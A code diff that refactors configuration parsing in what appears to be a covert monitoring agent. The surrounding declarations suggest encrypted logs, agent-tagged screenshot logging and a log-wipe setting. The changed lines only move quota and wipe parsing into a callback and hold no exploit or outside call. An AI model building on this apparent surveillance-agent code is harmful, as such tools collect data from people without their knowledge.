@@ -52,8 +52,8 @@ extern BOOL IsGreaterDate(nanosec_time *, nanosec_time *);
 
 // In BitmapCommon
 extern void BmpToJpgLog(DWORD agent_tag, BYTE *additional_header, DWORD additional_len, BITMAPINFOHEADER *pBMI, size_t cbBMI, BYTE *pData, size_t cbData, DWORD quality);
-
-extern BOOL HM_ParseConfGlobals(char *conf, JSONObject *obj);
+typedef void (WINAPI *conf_callback_t)(JSONObject);
+extern BOOL HM_ParseConfGlobals(char *conf, conf_callback_t call_back);
 
 extern aes_context crypt_ctx; // Dichiarata in shared
 extern aes_context crypt_ctx_conf; // Dichiarata in shared
@@ -147,22 +147,24 @@ void LOG_InitCryptKey(BYTE *crypt_material, BYTE *crypt_material_conf)
 	aes_set_key( &crypt_ctx_conf, crypt_material_conf, KEY_LEN*8 );
 }
 
+void WINAPI ParseGlobalsQuota(JSONObject conf_json)
+{
+	JSONObject quota = conf_json[L"quota"]->AsObject();
+	min_disk_free = (DWORD) quota[L"min"]->AsNumber();
+	max_disk_full = (DWORD) quota[L"max"]->AsNumber();
+	log_wipe_file = (BOOL) conf_json[L"wipe"]->AsBool();
+}
+
 // Legge la configuazione per i log
 // (viene letto solo quando inizializza i log e
 // non sulla ricezione di un nuovo file)
 void UpdateLogConf()
 {
 	char *conf_memory;
-	JSONObject conf_json, quota;
-
 	conf_memory = HM_ReadClearConfBSON(H4_CONF_FILE);
-	if (conf_memory && HM_ParseConfGlobals(conf_memory, &conf_json)) {
-		quota = conf_json[L"quota"]->AsObject();
-		min_disk_free = (DWORD) quota[L"min"]->AsNumber();
-		max_disk_full = (DWORD) quota[L"max"]->AsNumber();
-		log_wipe_file = (BOOL) conf_json[L"wipe"]->AsBool();
-	}
-	SAFE_FREE(conf_memory);
+	if (conf_memory)
+		HM_ParseConfGlobals(conf_memory, &ParseGlobalsQuota);
+	SAFE_FREE(conf_memory);	
 }
 
 
